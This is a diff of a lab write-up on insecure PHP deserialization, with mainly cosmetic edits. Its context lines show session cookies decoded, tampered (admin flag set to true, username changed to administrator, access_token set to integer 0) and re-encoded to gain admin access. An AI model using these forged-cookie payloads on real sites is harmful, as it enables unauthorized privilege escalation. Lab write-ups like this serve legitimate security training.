@@ -59,7 +59,7 @@ Session Cookie: Tzo0OiJVc2VyljoyOntzOjg6lnVzZXJuYW1lljtzOjY6lndpZW5lcil7czo1OiJh
 Decoding Result: O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
 ~~~
 
-Then I notice there's admin parameter, I modify the serialized object by changing 'admin;b:0' to 'admin;b:1', granting admin privileges.  
+Then I notice there's admin parameter, I modify the serialized object by changing `'admin;b:0'` to `'admin;b:1'`, granting admin privileges.  
 After that, re-encode the modified serialized data back into Base64 and use it as the new session cookie. 
 ~~~
 Serialized Object: O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;} 
@@ -88,7 +88,7 @@ Serialized Object: O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"acces
 Encoding Result: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
 ~~~
 
-I decide to use different approach from the previous lab. Instead of using Burp Repeater, I insert the encoded modified cookie session from the developer tool. 
+I decide to use different approach from the previous instance. Instead of using Burp Repeater, I insert the encoded modified cookie session from the developer tool. 
 - Right click on the page > Inspect > Application > Cookies > Paste the cookie into "Value"
   - Value: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
  
